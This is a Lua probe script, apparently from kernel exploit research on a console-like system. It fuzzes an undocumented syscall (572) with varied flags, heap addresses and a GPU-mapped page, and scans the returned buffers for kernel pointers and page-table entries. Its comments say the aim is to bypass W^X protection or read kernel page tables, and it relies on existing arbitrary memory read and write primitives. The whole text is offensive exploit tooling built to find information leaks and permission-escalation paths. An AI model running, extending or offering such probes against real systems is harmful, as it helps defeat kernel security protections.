-- CRASH_CLASS: MODERATE
-- PROBE 54j: sys 572 VM/PTE manipulation deep test
--
-- Context: Disassembly shows sys 572 (narg=4) traverses kernel page tables
-- via 0x782a80, does 16KB page alignment (and r12, 0xffffffffffffc000),
-- has copyout, and context-dependent validation paths. If this manipulates
-- PTEs, it could bypass W^X (change RW→RWX) or read kernel page tables.
--
-- Disassembly details:
--   - Context byte at [rax+0xc81]: nonzero → full mask (test ecx, 0xfffcfffe),
--     zero → single bit mask
--   - Bounds check against [r14+0x28]
--   - Permission check via 0xb2bb00
--   - arg1: virtual address (page-aligned)
--   - arg2: flags/command (bitmask validated)
--   - arg3: output/value
--   - arg4: count/length

print("=== PROBE 54j: SYS 572 VM/PTE DEEP TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc572 = make_syscall(572)
local outbuf = memory.alloc(0x2000)

-- Get a known heap address (page-aligned) to use as test VA
local test_page = memory.alloc(0x4000)
-- Align to 16KB
local test_page_num = to_num(test_page)
local aligned = test_page_num - (test_page_num % 0x4000) + 0x4000
local aligned_page = uint64(aligned)

-- Get GPU mmap region as another test address
local sc_mmap = make_syscall(477)
local gpu_ok, gpu_addr = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local gpu_page = nil
if gpu_ok then
    local gh, gl = get_hi_lo(gpu_addr)
    if gh ~= 0xFFFFFFFF or gl ~= 0xFFFFFFFF then
        gpu_page = gpu_addr
        print("[*] GPU mmap page: " .. hexval(gpu_page))
    end
end
print("[*] Heap aligned page: " .. string.format("0x%X", aligned))
print("")

-- Phase 1: Basic exploration — try all single-bit flags with heap address
print("[*] Phase 1: sys 572(heap_page, flag, outbuf, 1) for flag bits 0-31")
print("")

for bit = 0, 20 do
    local flag = 2^bit
    for i = 0, 0xFF, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc572(aligned_page, uint64(flag), uint64(outbuf), uint64(1),
            uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        if rv == 0 then
            print(string.format("  flag=0x%X  ret=0  [0]=%s [8]=%s", flag, hexval(q0), hexval(q1)))
            -- Scan for kernel pointers
            for i = 0, 56, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        else
            print(string.format("  flag=0x%X  ret=%d", flag, rv))
        end
    else
        print(string.format("  flag=0x%X  CRASHED: %s", flag, tostring(ret)))
    end
end
print("")

-- Phase 2: Try with flag=0 (context-dependent: zero context → single bit mask)
print("[*] Phase 2: sys 572 with flag=0, various args")
print("")

local test_args = {
    {aligned_page, uint64(0), uint64(outbuf), uint64(0x4000)},
    {aligned_page, uint64(0), uint64(outbuf), uint64(1)},
    {aligned_page, uint64(1), uint64(outbuf), uint64(0x4000)},
    {uint64(0), uint64(0), uint64(outbuf), uint64(0)},
}
local test_labels = {
    "heap, 0, outbuf, 0x4000",
    "heap, 0, outbuf, 1",
    "heap, 1, outbuf, 0x4000",
    "0, 0, outbuf, 0",
}

for idx, targs in ipairs(test_args) do
    for i = 0, 0xFF, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc572(targs[1], targs[2], targs[3], targs[4], uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        print(string.format("  572(%s) = %d  [0]=%s", test_labels[idx], rv, hexval(q0)))

        if rv == 0 then
            for i = 0, 120, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if (h ~= 0 or l ~= 0) and h ~= 0xFFFFFFFF then
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER!")
                        end
                    end
                end
            end
        end
    else
        print(string.format("  572(%s) CRASHED: %s", test_labels[idx], tostring(ret)))
    end
end
print("")

-- Phase 3: Try with GPU page (different VM region)
if gpu_page then
    print("[*] Phase 3: sys 572 with GPU mmap page")
    print("")

    for cmd = 0, 5 do
        for i = 0, 0xFF, 4 do safe_wd(outbuf + i, 0) end

        local ok, ret = pcall(function()
            return sc572(gpu_page, uint64(cmd), uint64(outbuf), uint64(1),
                uint64(0), uint64(0))
        end)

        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            print(string.format("  572(gpu, %d, outbuf, 1) = %d  [0]=%s", cmd, rv, hexval(q0)))
            if rv == 0 then
                for i = 0, 56, 8 do
                    local qv = safe_rq(outbuf + i)
                    if qv then
                        local h, l = get_hi_lo(qv)
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print(string.format("    >>> KPTR at +%d: %s", i, hexval(qv)))
                        end
                    end
                end
            end
        else
            print(string.format("  572(gpu, %d, outbuf, 1) CRASHED: %s", cmd, tostring(ret)))
        end
    end
    print("")
end

-- Phase 4: PTE read attempt — if flag=1 means "read PTE", the output might contain
-- the physical address and permission bits for the given VA
print("[*] Phase 4: Detailed output scan for PTE-like values")
print("")

for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

local ok, ret = pcall(function()
    return sc572(aligned_page, uint64(1), uint64(outbuf), uint64(16),
        uint64(0), uint64(0))
end)
if ok then
    local rv = signed32(ret)
    print(string.format("  572(heap, 1, outbuf, 16) = %d", rv))
    if rv == 0 then
        print("  Output (first 128 bytes):")
        for i = 0, 120, 8 do
            local d0 = safe_rd(outbuf + i) or 0
            local d1 = safe_rd(outbuf + i + 4) or 0
            if d0 ~= 0 or d1 ~= 0 then
                print(string.format("    +0x%03X: %08X %08X", i, d1, d0))
            end
        end
    end
end

print("")
print("=== PROBE 54j COMPLETE ===")
